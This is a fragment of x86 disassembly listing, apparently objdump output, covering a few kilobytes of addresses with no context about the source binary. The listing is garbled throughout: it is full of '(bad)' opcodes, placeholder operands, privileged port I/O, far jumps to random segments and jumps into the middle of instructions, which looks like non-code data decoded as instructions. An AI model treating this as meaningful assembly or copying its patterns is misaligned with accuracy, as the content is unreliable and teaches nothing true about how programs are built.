  4086e9:	mov    ebp,0x25690b17
  4086ee:	mov    dl,0xa
  4086f0:	push   ds
  4086f1:	push   esp
  4086f2:	in     eax,0xe0
  4086f4:	ins    DWORD PTR es:[edi],dx
  4086f5:	inc    edx
  4086f6:	xor    al,0xc
  4086f8:	(bad)  
  4086fa:	mov    al,0x35
  4086fc:	push   0x7
  4086fe:	je     0x40873b
  408700:	xchg   edi,eax
  408701:	int    0x87
  408703:	jne    0x408750
  408705:	adc    eax,DWORD PTR [ecx+0x1d]
  408708:	sub    cl,BYTE PTR [eax]
  40870a:	jmp    0x40878b
  40870c:	mov    eax,0x5952ef0b
  408711:	pop    ds
  408712:	mov    DWORD PTR [ecx+0x54],esp
  408715:	stc    
  408716:	aas    
  408717:	push   esp
  408718:	sbb    eax,DWORD PTR [ecx]
  40871a:	(bad)  
  40871b:	cmp    al,0xe6
  40871d:	mov    ch,0x1
  40871f:	cmp    eax,0x5c0fc031
  408724:	adc    cl,ah
  408726:	ins    BYTE PTR es:[edi],dx
  408727:	sub    esp,DWORD PTR [ebp-0x6248db5c]
  40872d:	xchg   dl,dl
  40872f:	xchg   ebp,eax
  408730:	jl     0x4086bc
  408732:	sub    al,0xc1
  408734:	shl    BYTE PTR [esi-0x72679380],0x5a
  40873b:	and    ebp,DWORD PTR [edx+0x6e]
  40873e:	sahf   
  40873f:	ins    DWORD PTR es:[edi],dx
  408740:	cmp    al,0x3
  408742:	retf   0xd6cc
  408745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408746:	sti    
  408747:	jecxz  0x40872e
  408749:	lods   al,BYTE PTR ds:[esi]
  40874a:	cmp    ebp,DWORD PTR [ecx-0x73c8b009]
  408750:	xlat   BYTE PTR ds:[ebx]
  408751:	(bad)  [edi]
  408753:	sub    al,0x16
  408755:	jge    0x408789
  408757:	pop    edx
  408758:	mov    al,ds:0xcc70a58c
  40875d:	dec    edx
  40875e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40875f:	inc    edi
  408760:	xchg   ebx,eax
  408761:	jnp    0x40871b
  408763:	mov    al,0xbf
  408765:	mov    ch,0x79
  408767:	aaa    
  408768:	shl    edi,1
  40876a:	mov    al,ds:0xc9d32b3a
  40876f:	call   0x83ae:0x173c796
  408776:	dec    edi
  408777:	shl    ecx,cl
  408779:	pusha  
  40877a:	mov    eax,ds:0xd38a23fb
  40877f:	ret    0xa0ef
  408782:	repnz cmc 
  408784:	cmc    
  408785:	or     al,0xb
  408787:	clc    
  408788:	add    cl,BYTE PTR [edx]
  40878a:	jecxz  0x408761
  40878c:	sbb    BYTE PTR [edx],dh
  40878e:	inc    ecx
  40878f:	int3   
  408790:	add    al,0x59
  408792:	pushf  
  408793:	push   edi
  408794:	test   eax,0xa901d4c6
  408799:	addr16 or ch,0x71
  40879d:	out    dx,eax
  40879e:	nop
  40879f:	xchg   ecx,eax
  4087a1:	fst    QWORD PTR [edx+0x444bb2d6]
  4087a7:	cli    
  4087a8:	fwait
  4087a9:	pop    ebx
  4087aa:	sbb    ebp,DWORD PTR [eax+ebp*4+0x7e1b493a]
  4087b1:	push   cs
  4087b2:	add    eax,0xfc8394a9
  4087b7:	ss cmp ecx,eax
  4087ba:	iret   
  4087bb:	pushf  
  4087bc:	inc    ebx
  4087bd:	outs   dx,BYTE PTR ds:[esi]
  4087be:	lahf   
  4087bf:	popf   
  4087c0:	fwait
  4087c1:	aas    
  4087c2:	push   cs
  4087c3:	add    esi,DWORD PTR [ebx]
  4087c5:	sbb    bl,dh
  4087c7:	push   ebx
  4087c8:	xchg   esi,eax
  4087c9:	std    
  4087ca:	cmc    
  4087cb:	xchg   edi,eax
  4087cc:	out    dx,eax
  4087cd:	pop    ecx
  4087ce:	xchg   ebx,esi
  4087d0:	pop    es
  4087d1:	rcl    BYTE PTR [esi+0x42fe0ffb],cl
  4087d7:	bound  esi,QWORD PTR [edi+0x55c40ef0]
  4087dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087de:	pushf  
  4087df:	sar    BYTE PTR [ebx+0x43],0xe5
  4087e3:	xor    al,0xda
  4087e5:	fisub  WORD PTR [edi]
  4087e7:	mov    ch,0x92
  4087e9:	xor    bh,BYTE PTR [esi-0x4ef15727]
  4087ef:	repnz out 0x27,al
  4087f2:	shl    DWORD PTR [esp+edx*8],1
  4087f5:	mov    eax,0xe39dc1a4
  4087fa:	in     al,dx
  4087fb:	sti    
  4087fc:	or     dh,bh
  4087fe:	jmp    0x4087c8
  408800:	out    0xa2,al
  408802:	popa   
  408803:	pop    edi
  408804:	sbb    eax,0x8591c374
  408809:	retf   
  40880a:	xor    BYTE PTR [edi],bl
  40880c:	mov    ds:0xa99b9441,al
  408811:	sub    edi,DWORD PTR [ecx+ebx*1]
  408814:	push   eax
  408815:	cmp    esi,DWORD PTR [edi+0x6c]
  408818:	jns    0x408842
  40881a:	out    dx,eax
  40881b:	inc    esi
  40881c:	daa    
  40881d:	lds    ecx,FWORD PTR [esi-0xb]
  408820:	push   ss
  408821:	xchg   ebp,eax
  408822:	test   dl,al
  408824:	jmp    DWORD PTR [ebx]
  408826:	xlat   BYTE PTR ds:[ebx]
  408827:	fcmovu st,st(2)
  408829:	aam    0xc1
  40882b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40882c:	es push eax
  40882e:	pop    esi
  40882f:	out    dx,al
  408830:	dec    ecx
  408831:	icebp  
  408832:	in     al,dx
  408833:	mov    esp,0x38fe7d2b
  408838:	mov    dh,0xc6
  40883a:	in     eax,0x66
  40883c:	imul   eax,DWORD PTR [edx],0xe755293b
  408842:	lods   al,BYTE PTR ds:[esi]
  408843:	test   DWORD PTR [ebx],edi
  408845:	adc    eax,ebp
  408847:	push   DWORD PTR [ebx]
  408849:	je     0x40883e
  40884b:	inc    ebx
  40884c:	cmc    
  40884d:	mov    ah,BYTE PTR [ecx+ebp*2]
  408850:	cmp    DWORD PTR [esi+edx*2],edx
  408853:	es dec edx
  408855:	int    0xe8
  408857:	xlat   BYTE PTR ds:[ebx]
  408858:	retf   0xf433
  40885b:	push   ebp
  40885c:	add    al,0x3a
  40885e:	mov    ch,0xe9
  408860:	inc    edx
  408861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408862:	in     eax,dx
  408863:	jecxz  0x4088e2
  408865:	adc    ch,BYTE PTR [eax+0x26]
  408868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408869:	inc    ecx
  40886a:	cmc    
  40886b:	jl     0x408845
  40886d:	mov    edx,0xf07f4794
  408872:	stos   BYTE PTR es:[edi],al
  408873:	mov    ch,0x4a
  408875:	imul   edi,DWORD PTR [edx+0x61237ce5],0x9f95ba4a
  40887f:	pusha  
  408880:	xchg   BYTE PTR [edx+0x4893654e],cl
  408886:	xchg   edi,eax
  408887:	xchg   ebp,edi
  408889:	inc    edi
  40888a:	push   ebx
  40888b:	call   0x990a:0xbe7bc1b9
  408892:	cld    
  408893:	pushf  
  408894:	and    DWORD PTR ds:0x1a79fcdc,eax
  40889a:	sub    dl,cl
  40889c:	xchg   ebx,eax
  40889d:	or     eax,0x9528e353
  4088a2:	adc    eax,0x131a43cd
  4088a7:	in     eax,dx
  4088a8:	pop    ebp
  4088a9:	push   eax
  4088aa:	pop    ecx
  4088ab:	cmp    DWORD PTR [esi-0x7de18306],ebp
  4088b1:	or     bh,dl
  4088b3:	inc    esi
  4088b4:	sbb    esi,DWORD PTR [ebx-0x2a]
  4088b7:	and    ch,BYTE PTR [ebp+0x8a1b739]
  4088bd:	cwde   
  4088be:	xor    DWORD PTR [ebx-0x1e],ecx
  4088c1:	push   ecx
  4088c2:	adc    BYTE PTR [edi+0xf77a49d],bh
  4088c8:	or     BYTE PTR [ecx+ecx*1+0x3f],ah
  4088cc:	push   ss
  4088cd:	stc    
  4088ce:	js     0x408940
  4088d0:	scas   al,BYTE PTR es:[edi]
  4088d1:	loope  0x40891b
  4088d3:	dec    edi
  4088d4:	cli    
  4088d5:	push   0x32bc8740
  4088da:	xchg   eax,ecx
  4088dc:	or     ecx,eax
  4088de:	add    BYTE PTR [eax+0x505fcb48],bh
  4088e4:	cmp    esp,esi
  4088e6:	shr    BYTE PTR [edi+edi*8+0xd4a91f0],0x64
  4088ee:	icebp  
  4088ef:	mov    esi,0xb5b4db4e
  4088f4:	cmovnp edi,edx
  4088f7:	test   al,0x5e
  4088f9:	popa   
  4088fa:	xchg   ebx,eax
  4088fb:	inc    eax
  4088fc:	sub    DWORD PTR [bp+di-0x41],esp
  408900:	xor    BYTE PTR [ebx-0x506ddd21],cl
  408906:	cwde   
  408907:	xchg   edi,eax
  408908:	pop    eax
  408909:	adc    al,0xee
  40890b:	xor    esi,esp
  40890d:	fiadd  WORD PTR [eiz*2+0x5dc3c614]
  408914:	xchg   edx,eax
  408915:	out    0x2c,eax
  408917:	mov    bl,0xa7
  408919:	jae    0x40890c
  40891b:	sub    bh,ah
  40891d:	jmp    0x265a1422
  408922:	jae    0x408903
  408924:	lea    edx,[edx+0x341cd5b2]
  40892a:	arpl   WORD PTR [ebp+ebx*2-0xfcbb461],di
  408931:	mov    edx,0x6d75508b
  408936:	(bad)  
  408937:	sub    eax,0xecd1bf97
  40893c:	xchg   ecx,edi
  40893e:	inc    ebp
  40893f:	dec    esp
  408940:	sub    ebp,DWORD PTR [edx+ebx*8-0x4cf9414c]
  408947:	mov    WORD PTR [ebp-0x70],?
  40894a:	ins    DWORD PTR es:[edi],dx
  40894b:	jp     0x408905
  40894d:	dec    edi
  40894e:	dec    ecx
  40894f:	jmp    0x924c055b
  408954:	movzx  ebp,BYTE PTR [esi+ebp*1]
  408958:	aam    0x1a
  40895a:	jmp    0xc106e772
  40895f:	cld    
  408960:	(bad)  
  408961:	jno    0x4089d0
  408963:	outs   dx,DWORD PTR ds:[esi]
  408964:	add    eax,0xce469077
  408969:	test   al,0x15
  40896b:	cs fwait
  40896d:	jmp    0xc7d2:0x4adaed8
  408974:	ins    BYTE PTR es:[edi],dx
  408975:	sub    eax,0xd357891
  40897a:	push   esi
  40897b:	adc    eax,0xbcc0c7fc
  408980:	aad    0x22
  408982:	or     edi,ecx
  408984:	mov    cs,ecx
  408986:	ja     0x408937
  408988:	dec    DWORD PTR [esi-0x6a]
  40898b:	mov    bl,0x66
  40898d:	scas   eax,DWORD PTR es:[edi]
  40898e:	pusha  
  40898f:	imul   esi,DWORD PTR [esi-0x72],0x4374fc33
  408996:	and    BYTE PTR [eax+0x6a23b0fd],bh
  40899c:	adc    eax,0x389ecc
  4089a1:	int    0x87
  4089a3:	ja     0x408945
  4089a5:	mov    esi,0x264fdc78
  4089aa:	dec    edx
  4089ab:	in     eax,dx
  4089ac:	call   0xbd12:0x89e6314e
  4089b3:	int    0x52
  4089b5:	mov    ah,0x37
  4089b7:	xchg   esp,eax
  4089b8:	mov    edi,0xcb42dd22
  4089bd:	xor    al,0x1d
  4089bf:	mov    esi,0x6fa66094
  4089c4:	ins    DWORD PTR es:[edi],dx
  4089c5:	dec    ebx
  4089c6:	ins    BYTE PTR es:[edi],dx
  4089c7:	dec    esp
  4089c8:	adc    BYTE PTR [esi+0x5b],dh
  4089cb:	(bad)  
  4089cc:	and    ebp,ebx
  4089ce:	mov    edi,0x8ff2356c
  4089d3:	out    0x1c,al
  4089d5:	popa   
  4089d6:	les    edi,FWORD PTR [edx-0x49]
  4089d9:	inc    esp
  4089da:	in     eax,0xbd
  4089dc:	ror    DWORD PTR [eax-0x34],0xf3
  4089e0:	inc    ebx
  4089e1:	adc    ecx,eax
  4089e3:	xchg   ebp,eax
  4089e4:	push   edx
  4089e5:	lods   al,BYTE PTR ds:[esi]
  4089e6:	dec    bl
  4089e8:	mov    bh,BYTE PTR [esi]
  4089ea:	stos   DWORD PTR es:[edi],eax
  4089eb:	data16 jle 0x4089f8
  4089ee:	stos   BYTE PTR es:[edi],al
  4089ef:	mov    ch,cl
  4089f1:	lods   eax,DWORD PTR ds:[esi]
  4089f2:	repnz and DWORD PTR [edi-0x198a88e0],ecx
  4089f9:	loope  0x408a67
  4089fb:	sbb    bl,BYTE PTR [edx]
  4089fd:	push   cs
  4089fe:	outs   dx,BYTE PTR ds:[esi]
  4089ff:	mov    ah,0xca
  408a01:	fwait
  408a02:	jnp    0x4089ad
  408a04:	into   
  408a05:	sbb    eax,DWORD PTR [ebx]
  408a07:	imul   eax,DWORD PTR [ebp+0xba3bde9],0x891dbff5
  408a11:	jb     0x408a87
  408a13:	mov    al,ds:0x2bf92d6f
  408a18:	lsl    esi,WORD PTR [edx-0x480b3cb0]
  408a1f:	mov    ds,WORD PTR [ebx+edi*2-0x7b]
  408a23:	rcl    esp,0x32
  408a26:	daa    
  408a27:	out    dx,al
  408a28:	loopne 0x4089fa
  408a2a:	pop    es
  408a2b:	or     ah,0x77
  408a2e:	pop    eax
  408a2f:	lock jmp 0xa28b3d3f
  408a35:	ins    DWORD PTR es:[edi],dx
  408a36:	jb     0x408aa9
  408a38:	mov    al,0x84
  408a3a:	dec    esp
  408a3b:	mul    eax
  408a3d:	enter  0x231,0xd2
  408a41:	sub    eax,0x7e79a05c
  408a46:	mov    ds:0x69ebe19a,eax
  408a4b:	xlat   BYTE PTR ds:[ebx]
  408a4c:	aad    0xd5
  408a4e:	push   ss
  408a4f:	or     al,0x16
  408a51:	loopne 0x4089f3
  408a53:	push   edi
  408a54:	not    cl
  408a56:	push   ds
  408a57:	jp     0x408a29
  408a59:	cmp    ebp,DWORD PTR [ebx-0x3dacd835]
  408a5f:	add    bh,BYTE PTR [ebp-0x3b04e201]
  408a65:	sbb    DWORD PTR [esp+eax*1-0x1a],eax
  408a69:	sahf   
  408a6a:	cmp    BYTE PTR [esp+edi*1+0x612a6720],cl
  408a71:	or     ecx,esp
  408a73:	je     0x408a3f
  408a75:	adc    eax,ebp
  408a77:	sub    DWORD PTR [esi+eax*4],0xef42c88b
  408a7e:	cmp    eax,0x3f59ba03
  408a83:	jl     0x408aa0
  408a85:	lea    esi,[ebp+0x1f]
  408a88:	xchg   esi,eax
  408a89:	outs   dx,BYTE PTR ds:[esi]
  408a8a:	jmp    0x7c5e:0x71c31769
  408a91:	or     bh,BYTE PTR [ebp+ebx*8+0x2b4203ba]
  408a98:	xchg   esi,eax
  408a99:	lahf   
  408a9a:	mov    ds:0x44f6d4d3,eax
  408a9f:	jmp    0x9b8eef17
  408aa4:	icebp  
  408aa5:	cmp    dl,BYTE PTR [edx-0x13]
  408aa8:	imul   esp,DWORD PTR [ebx+0x72834dd6],0x6816d993
  408ab2:	and    cl,BYTE PTR [ebx]
  408ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ab5:	stc    
  408ab6:	mov    esp,0xc4ae2d50
  408abb:	cli    
  408abc:	je     0x408aa2
  408abe:	mov    esi,ds
  408ac0:	jge    0x408a93
  408ac2:	pop    es
  408ac3:	xchg   ebp,eax
  408ac4:	xlat   BYTE PTR ds:[ebx]
  408ac5:	mov    di,0x4709
  408ac9:	pop    ss
  408aca:	sar    DWORD PTR [edi],1
  408acc:	push   0x33
  408ace:	and    BYTE PTR [ecx+0x4],dh
  408ad1:	sub    dl,ah
  408ad3:	add    ch,BYTE PTR [esp+eax*4+0x31648afa]
  408ada:	add    DWORD PTR [eax+0x77d5c716],0xffffff80
  408ae1:	stc    
  408ae2:	pop    ss
  408ae3:	pop    esi
  408ae4:	dec    edx
  408ae5:	jno    0x408a74
  408ae7:	pop    ebp
  408ae8:	in     eax,dx
  408ae9:	arpl   WORD PTR [esi],si
  408aeb:	jle    0x408afa
  408aed:	mov    ds:0xa694ce02,eax
  408af2:	add    ch,ch
  408af4:	adc    eax,0x58556160
  408af9:	xor    DWORD PTR [ecx+0x36],esi
  408afc:	pop    esi
  408afd:	mov    eax,ds:0x825aab9a
  408b02:	mov    ds:0xda975778,eax
  408b07:	mov    DWORD PTR [esi],ecx
  408b09:	scas   al,BYTE PTR es:[edi]
  408b0a:	lods   al,BYTE PTR ds:[esi]
  408b0b:	loop   0x408b58
  408b0d:	shl    DWORD PTR [ecx-0xd],1
  408b10:	rol    BYTE PTR [edx+ecx*2-0x26],1
  408b14:	jb     0x408b48
  408b16:	call   0xe78fffc0
  408b1b:	ror    BYTE PTR [ebx],cl
  408b1d:	jecxz  0x408b18
  408b1f:	sti    
  408b20:	inc    edx
  408b21:	jbe    0x408b95
  408b23:	es fwait
  408b25:	ret    0xd37
  408b28:	sub    eax,0xb391c718
  408b2d:	stos   DWORD PTR es:[edi],eax
  408b2e:	jmp    0x4a87:0xfbbf5d4c
  408b35:	shl    DWORD PTR [edi+0x216f24a3],0x5f
  408b3c:	out    0x3a,eax
  408b3e:	push   edx
  408b3f:	mov    bh,BYTE PTR [esi-0x410bc164]
  408b45:	adc    BYTE PTR cs:0x4be5ebc2,cl
  408b4c:	pop    edi
  408b4d:	add    al,BYTE PTR [eax]
  408b4f:	in     al,0x7e
  408b51:	in     al,dx
  408b52:	push   edi
  408b53:	aad    0x50
  408b55:	inc    ecx
  408b56:	and    BYTE PTR [edx],bh
  408b58:	pop    ebx
  408b59:	sti    
  408b5a:	jmp    0xabd7bad6
  408b5f:	outs   dx,BYTE PTR ds:[esi]
  408b60:	jecxz  0x408ba5
  408b62:	mov    al,ah
  408b64:	out    0x31,eax
  408b66:	test   DWORD PTR [edi],esp
  408b68:	sub    edx,DWORD PTR [esi+0x59]
  408b6b:	pop    esi
  408b6c:	jmp    0xc77f:0xf2552c8c
  408b73:	inc    ebp
  408b74:	pop    edi
  408b75:	std    
  408b76:	push   ebx
  408b77:	in     eax,dx
  408b78:	rcr    BYTE PTR [edx-0x74],0x6d
  408b7c:	fimul  DWORD PTR [esi+0x3]
  408b7f:	adc    edi,DWORD PTR [ebp+ebx*1+0x28]
  408b83:	jbe    0x408b75
  408b85:	sbb    ebp,esp
  408b87:	add    DWORD PTR [edx+0x38],edx
  408b8a:	cmp    eax,0x2abc7f8b
  408b8f:	mov    ds:0x328c5725,al
  408b94:	push   edx
  408b95:	outs   dx,BYTE PTR ds:[esi]
  408b96:	aas    
  408b97:	call   0xd902:0x8446e34
  408b9e:	es jbe 0x408b54
  408ba1:	ins    DWORD PTR es:[edi],dx
  408ba2:	enter  0xa159,0x23
  408ba6:	mov    edx,0xfe8cd98e
  408bab:	in     al,0xa8
  408bad:	fimul  WORD PTR [edi-0x2da38bf7]
  408bb3:	sahf   
  408bb4:	push   esp
  408bb5:	adc    DWORD PTR [ecx+0x31bf7a95],0xffffffa7
  408bbc:	inc    ebp
  408bbd:	fiadd  WORD PTR [ecx]
  408bbf:	das    
  408bc0:	jb     0x408bca
  408bc2:	fdivr  DWORD PTR [ebx]
  408bc4:	pop    ecx
  408bc5:	sub    BYTE PTR [edi+0x39e70f7d],bh
  408bcb:	mov    edi,0x12b4457c
  408bd0:	arpl   WORD PTR [esi],si
  408bd2:	stc    
  408bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bd4:	pop    ds
  408bd5:	push   edi
  408bd6:	(bad)  
  408bd8:	inc    ebx
  408bd9:	out    0xf7,al
  408bdb:	nop
  408bdc:	adc    esi,eax
  408bde:	pop    edi
  408bdf:	rcl    BYTE PTR ds:0xa82d4c6e,1
  408be5:	xchg   esp,eax
  408be6:	cmp    edi,0x7b
  408be9:	sti    
  408bea:	xchg   ebp,eax
  408beb:	rcr    BYTE PTR [ebx+0x1d56344f],1
  408bf1:	stos   BYTE PTR es:[edi],al
  408bf2:	jle    0x408c55
  408bf4:	in     al,dx
  408bf5:	dec    esp
  408bf6:	in     eax,dx
  408bf7:	lods   eax,DWORD PTR ds:[esi]
  408bf8:	enter  0xe1bf,0xb9
  408bfc:	ficom  WORD PTR [eax+0x7]
  408bff:	sbb    DWORD PTR [edi-0x5a],0xffffff8d
  408c03:	arpl   WORD PTR [edx+edi*2+0x1c],bp
  408c07:	pop    ebp
  408c08:	dec    eax
  408c09:	inc    ecx
  408c0a:	fisub  WORD PTR [esp+ecx*2]
  408c0d:	clc    
  408c0e:	mov    ch,0x98
  408c10:	shr    DWORD PTR [ecx+0xac5e4e2],cl
  408c16:	sbb    DWORD PTR [ebp+0x6b],ebp
  408c19:	aas    
  408c1a:	jmp    0x408c52
  408c1c:	retf   0xe4f7
  408c1f:	icebp  
  408c20:	jmp    0x408c4d
  408c22:	mov    esi,0x24675936
  408c27:	mov    bh,0x20
  408c29:	ins    BYTE PTR es:[edi],dx
  408c2a:	and    BYTE PTR [edx-0x77c41cf0],dh
  408c30:	pop    edi
  408c31:	pop    esp
  408c32:	in     eax,dx
  408c33:	mov    esp,0x5e67c3a4
  408c38:	xchg   ecx,eax
  408c39:	in     eax,0x64
  408c3b:	cmp    esp,DWORD PTR [edx-0x70d0c3c6]
  408c41:	ss add eax,0x3a809b16
  408c47:	shr    dl,0x44
  408c4a:	adc    DWORD PTR [ebp+0x35],eax
  408c4d:	std    
  408c4e:	push   ss
  408c4f:	dec    eax
  408c50:	aad    0xc
  408c52:	cmp    BYTE PTR [ecx-0x48ad0f5c],bh
  408c58:	dec    ecx
  408c59:	stos   BYTE PTR es:[edi],al
  408c5a:	jp     0x408c83
  408c5c:	test   eax,0x30f8375a
  408c61:	xor    al,0x62
  408c63:	jecxz  0x408c5f
  408c65:	and    esi,ebp
  408c67:	mov    bl,0xc8
  408c69:	or     cl,0xf8
  408c6c:	adc    al,0x7c
  408c6e:	xchg   edi,eax
  408c6f:	or     al,0x8a
  408c71:	mov    ds:0x129f6e3,eax
  408c76:	iret   
  408c77:	ja     0x408c0d
  408c79:	test   DWORD PTR [ebx-0x54],0xd747f86d
  408c80:	and    al,0x73
  408c82:	push   ecx
  408c83:	out    0xa7,eax
  408c85:	fsub   QWORD PTR [edi+ebp*1-0x3f8bad0e]
  408c8c:	clc    
  408c8d:	mov    cl,0x4a
  408c8f:	sbb    eax,0x2015c0d2
  408c94:	sbb    al,0x6e
  408c96:	mov    bl,0xc8
  408c98:	mov    eax,ds:0xbf9206a0
  408c9d:	(bad)  
  408c9e:	repz fidivr WORD PTR [esi+esi*4]
  408ca2:	lods   eax,DWORD PTR ds:[esi]
  408ca3:	repz pop ds
  408ca5:	test   DWORD PTR [esi+0x2e],ebx
  408ca8:	mov    eax,ds:0x58465fdd
  408cad:	mov    ?,WORD PTR [ecx-0x1d98d174]
  408cb3:	nop
  408cb4:	in     al,0xa7
  408cb6:	dec    ebp
  408cb7:	aad    0x79
  408cb9:	js     0x408cdd
  408cbb:	inc    ebx
  408cbc:	and    dh,BYTE PTR [ebx]
  408cbe:	aam    0x7a
  408cc0:	mov    eax,0xe3874146
  408cc5:	jns    0x408d16
  408cc7:	cmp    BYTE PTR [edx-0x3f7487d4],ch
  408ccd:	and    eax,eax
  408ccf:	data16 jp 0x408c90
  408cd2:	cmp    esp,DWORD PTR ds:0xb830a79
  408cd8:	or     ch,bl
  408cda:	cmp    DWORD PTR [eax-0x672daa67],ebp
  408ce0:	cld    
  408ce1:	das    
  408ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ce3:	ja     0x408cfa
  408ce5:	or     ah,BYTE PTR [ebx+0x5]
  408ce8:	jg     0x408c9f
  408cea:	iret   
  408ceb:	loopne 0x408c7c
  408ced:	sub    DWORD PTR [edi+ebp*4],esp
  408cf0:	ins    DWORD PTR es:[edi],dx
  408cf1:	dec    ebx
  408cf2:	jecxz  0x408cf4
  408cf4:	pop    eax
  408cf5:	inc    eax
  408cf6:	dec    ecx
  408cf7:	inc    ecx
  408cf8:	jg     0x408d59
  408cfa:	mov    ebp,0x5e7da2d
  408cff:	inc    ebx
  408d00:	int    0x7c
  408d02:	out    dx,eax
  408d03:	add    DWORD PTR [eax],esi
  408d05:	(bad)
  408d08:	push   ss
  408d09:	daa    
  408d0a:	ret    
  408d0b:	fild   WORD PTR [esi+0x11caec84]
  408d11:	sbb    bl,BYTE PTR [edi-0x9022]
  408d17:	aam    0x96
  408d19:	loopne 0x408d66
  408d1b:	inc    ebx
  408d1c:	mov    cl,0xfc
  408d1e:	sub    esp,esp
  408d20:	in     ax,dx
  408d22:	aaa    
  408d23:	push   esi
  408d24:	xor    BYTE PTR [edi-0x41bcbc10],al
  408d2a:	mov    ecx,0x3a385df
  408d2f:	lods   eax,DWORD PTR es:[esi]
  408d31:	mov    ah,0x32
  408d33:	xchg   ebp,eax
  408d34:	jb     0x408d0d
  408d36:	xor    dh,BYTE PTR ds:0x1f077ca8
  408d3c:	jbe    0x408d7f
  408d3e:	cdq    
  408d3f:	mov    ebx,0xccfb164f
  408d44:	call   0x613e079d
  408d49:	add    DWORD PTR ds:0x99f9afce,ecx
  408d4f:	bound  edi,QWORD PTR [eax+0x294084f]
  408d55:	mov    ebx,0x762cd9d6
  408d5a:	std    
  408d5b:	mov    esp,?
  408d5d:	pop    esp
  408d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d5f:	mov    fs,eax
  408d61:	inc    esi
  408d62:	xor    al,0x6d
  408d64:	jne    0x408da4
  408d66:	fisubr DWORD PTR [edx-0x38]
  408d69:	arpl   bx,sp
  408d6b:	jle    0x408da1
  408d6d:	and    eax,0xbde91118
  408d72:	cli    
  408d73:	mov    edx,0xa6ac0f81
  408d78:	test   al,0x52
  408d7a:	mov    esi,0x231a296
  408d7f:	(bad)  
  408d80:	in     al,0xa9
  408d82:	jmp    0xcd0cb6f8
  408d87:	shl    DWORD PTR [esi+0x43],1
  408d8a:	add    al,0x18
  408d8c:	jmp    0x5c2a:0x581fa6d6
  408d93:	add    eax,0x3566b06f
  408d98:	rcr    al,cl
  408d9a:	dec    edx
  408d9b:	xchg   edi,eax
  408d9c:	inc    ebp
  408d9d:	xchg   DWORD PTR [esp+edi*1+0x7c],edi
  408da1:	ret    0x280d
  408da4:	inc    esp
  408da5:	xlat   BYTE PTR ds:[ebx]
  408da6:	add    bl,bl
  408da8:	leave  
  408da9:	test   bh,bl
  408dab:	iret   
  408dac:	and    ebx,DWORD PTR [ebx+0x36a1b79e]
  408db2:	xor    eax,0xad67daae
  408db7:	retf   
  408db8:	xor    ah,dl
  408dba:	bound  ecx,QWORD PTR [ecx+eiz*1+0x4d9fc164]
  408dc1:	sbb    eax,0xd68f0661
  408dc6:	jmp    0x4455c0f1
  408dcb:	pop    edx
  408dcc:	ror    DWORD PTR cs:0x63790098,0xd2
  408dd4:	aam    0x8f
  408dd6:	call   0x5dda:0xbf16695c
  408ddd:	sbb    al,0xff
  408ddf:	pop    eax
  408de0:	test   BYTE PTR [edi+0x479b9001],dh
  408de6:	scas   eax,DWORD PTR es:[edi]
  408de7:	jmp    0x408e59
  408de9:	jb     0x408e12
  408deb:	add    eax,0x6df296e
  408df0:	adc    ch,BYTE PTR [ebp+0x10]
  408df3:	ins    DWORD PTR es:[edi],dx
  408df4:	sub    eax,0x9ed40abb
  408df9:	dec    ebx
  408dfa:	and    BYTE PTR [edi-0x7f],ah
  408dfd:	jle    0x408dfd
  408dff:	jl     0x408d9c
  408e01:	jmp    0x9758:0x26a6b269
  408e08:	push   cs
  408e09:	fist   DWORD PTR [esp+ebp*1]
  408e0c:	imul   ch
  408e0e:	and    BYTE PTR [edx-0x30],al
  408e11:	sub    DWORD PTR [edx],edi
  408e13:	fidivr DWORD PTR [esi-0xf]
  408e16:	stos   DWORD PTR es:[edi],eax
  408e17:	jo     0x408db1
  408e19:	jo     0x408e30
  408e1b:	sub    esp,DWORD PTR [edx+0x46]
  408e1e:	dec    esp
  408e1f:	xor    BYTE PTR [esi+0x391cdbd8],bl
  408e25:	ja     0x408e2b
  408e27:	mov    bh,BYTE PTR [eax-0x1ce09630]
  408e2d:	jge    0x408e7c
  408e2f:	ins    DWORD PTR es:[edi],dx
  408e30:	ja     0x408e86
  408e32:	aam    0xac
  408e34:	adc    al,0xda
  408e36:	inc    ebx
  408e37:	xor    eax,0x90b4dfb2
  408e3c:	arpl   cx,bx
  408e3e:	push   esp
  408e3f:	lods   eax,DWORD PTR ds:[esi]
  408e40:	push   es
  408e41:	or     bl,ch
  408e43:	scas   al,BYTE PTR es:[edi]
  408e44:	dec    ecx
  408e45:	out    dx,al
  408e46:	mov    ch,0x1c
  408e48:	jno    0x408ea2
  408e4a:	repnz push ebx
  408e4c:	les    esi,FWORD PTR [edx-0x64]
  408e4f:	ds inc ebp
  408e51:	sar    al,0xd
  408e54:	adc    BYTE PTR [ebx+0x1065135b],ch
  408e5a:	or     eax,0xaae90875
  408e5f:	sbb    BYTE PTR [ecx+ebp*8],ah
  408e62:	or     DWORD PTR [ebx-0x1d],0x1336ef82
  408e69:	lods   eax,DWORD PTR ds:[esi]
  408e6a:	mov    esi,0x1ee5ffb
  408e6f:	xor    dl,al
  408e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e72:	(bad)  
  408e73:	add    ch,ch
  408e75:	and    BYTE PTR [edx+eiz*4+0x61],al
  408e79:	not    DWORD PTR ds:0x94cd3e20
  408e7f:	xchg   edi,eax
  408e80:	mov    bl,0xef
  408e82:	gs addr16 ret 
  408e85:	ss and esi,ebx
  408e88:	dec    edx
  408e89:	sub    DWORD PTR [ecx+0x74],esi
  408e8c:	popf   
  408e8d:	into   
  408e8e:	jbe    0x408ec6
  408e90:	out    0x8e,eax
  408e92:	mov    DWORD PTR [edi+0xe],0x89856bf8
  408e99:	in     eax,0xf6
  408e9b:	inc    eax
  408e9c:	lock outs dx,DWORD PTR ds:[esi]
  408e9e:	push   cs
  408e9f:	dec    ecx
  408ea0:	mov    al,ds:0x57cc9b15
  408ea5:	push   esp
  408ea6:	mov    ebp,0x3a3e5843
  408eab:	(bad)  
  408eac:	pop    edi
  408ead:	out    0xca,al
